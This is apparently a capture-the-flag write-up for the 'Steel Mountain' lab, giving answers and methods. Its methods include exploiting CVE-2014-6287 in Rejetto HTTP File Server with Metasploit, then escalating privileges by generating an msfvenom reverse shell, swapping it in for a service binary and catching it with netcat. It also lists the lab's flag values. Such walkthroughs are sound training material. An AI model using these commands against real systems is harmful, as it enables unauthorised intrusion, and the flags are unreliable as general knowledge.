# Steel Mountain

> Sep 20, 2021

```bash
export IP=10.10.28.167
```

## Task 1 

1. Who is the employee of the month? 

	`Answer: Bill Harper`

	**Method:** Found inspecting the image element of the web page.

## Task 2 

1. Scan the machine with nmap. What is the other port running a web server on?

	`Answer: 8080`

	**Method:** Nmap scan

2. Take a look at the other web server. What file server is running?

	`Answer: Rejetto HTTP File Server`

	**Method:** Nav to port 8080, check the server information.

3. What is the CVE number to exploit this file server?

	`Answer: CVE-2014-6287`

	**Method:** 

		Use searchsploit which allows you to see vulns.
		
		Search for the exploits:
		>$ searchsploit "Rejetto HTTP File Server"

		When a exploit is found, use -x with the path to gain more information.
		>$ searchsploit -x "windows/remote/34668.txt"

4. Use Metasploit to get an initial shell. What is the user flag?

	`Answer: b04763b6fcf51fcd7c13abc7db4fd365`

	**Method:**

		Use metasploit:
		>$ sudo /opt/metasploit-framework/msfconsole

		Search for your exploit:
		>$ search httpfileserver

		Select:
		>$ use 0

		Look at options:
		>$ show options

		Assign ports/hosts:
		>$ set LHOST tun0
		>$ set RPORT 8080
		>$ set SRVPORT 9090
		>$ set RHOST 10.10.108.242

		Run:
		>$ run

		Now connected, navigate around:
		>$ getuid
		>$ dir

		Navigate to the Desktop dir and cat the flag.

## Task 3

1. 	Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

	`Answer: AdvancedSystemCareService9`

	**Method:** After starting the powershell script, running the `Invoke-AllChecks` command uncovers this.

2. What is the root flag?

	`Answer: 9af5f314f57607c00fd09803a587db80`

	**Method:**
    
		Use msfvenom to generate a reverse shell:
		>$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=5555 -f exe -o shell5555.exe

		Upload the shell to meterpretor:
		>$ upload shell5555.exe in the /Windows/Tasks dir.

		Stop the service then copy the shell5555.exe to the correct dir.
		>$ net stop AdvancedSystemCareService9
		>$ copy shell5555.exe "C:/Program Files (x86)/IObit/Advanced Systemcare/ASCService.exe"
		>$ net start AdvancedSystemCareService9

		Start nc on host:
		>$ nc -lnvp 5555

## Task 4

1. What powershell -c command could we run to manually find out the service name? 

	`Answer: powershell -c "Get-Service"`
